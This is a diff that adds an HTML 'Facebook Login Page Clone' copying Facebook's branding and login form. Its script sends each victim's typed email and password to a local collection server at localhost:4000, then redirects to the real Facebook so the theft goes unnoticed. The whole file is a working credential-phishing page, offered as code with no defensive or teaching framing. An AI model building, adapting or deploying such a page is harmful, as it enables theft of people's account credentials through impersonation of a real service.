@@ -1,0 +1,73 @@
+<!-- HTML Code for Facebook Login Page Clone -->
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Login to your Facebook account">
+  <title>Facebook Login</title>
+  <link rel="stylesheet" type="text/css" href="./style.css">
+  <link rel="icon" sizes="16x16" href="./facebook2.png">
+</head>
+<body>
+  <noscript>
+    <p>
+      Seems javascript is disabled on your browser. Please enable javascript for the full functionality of this site.
+    </p>
+  </noscript>
+  <div class="login-container">
+    <img src="facebook2.png" alt="Facebook logo">
+    <form>
+      <p id="validator"></p>
+      <input type="text" name="email" placeholder="Email or Phone">
+      <input type="password" placeholder="Password">
+      <button name='sub' type="button">Log In</button>
+    </form>
+    <a href="#" class="forgot-pass">Forgot password?</a>
+  </div>
+
+  <script>
+    const $ = e => document.querySelector(e);
+    const $all = e => document.querySelectorAll(e);
+
+    const reqUrl = "http://localhost:4000/";
+
+    const emailI = $("input[type='text']") , passI = $("input[type='password']"), validator = $("#validator");
+    const submitB = $("button[name='sub']") , input = $all("input");
+
+    const inputArr = [...input];
+
+    submitB.addEventListener("click", e => {
+      e.preventDefault();
+      validator.innerHTML = ""
+      if(inputArr.every(e => e.value)) {
+        fetch(reqUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            email: emailI.value,
+            pass: passI.value
+          })
+        })
+        .then(response => response.json())
+        .then(data => {
+          if(data.isSuccess == true) {
+            location.href = "https://web.facebook.com/";
+          }
+          else {
+            validator.innerHTML = "Incorrect login details. Try again"
+          }
+        })
+        .catch(error => console.error(error))
+        
+      }
+      else {
+        validator.innerHTML = "Input feilds shouldn't be empty"
+      }
+
+    })
+  </script>
+</body>
+</html>
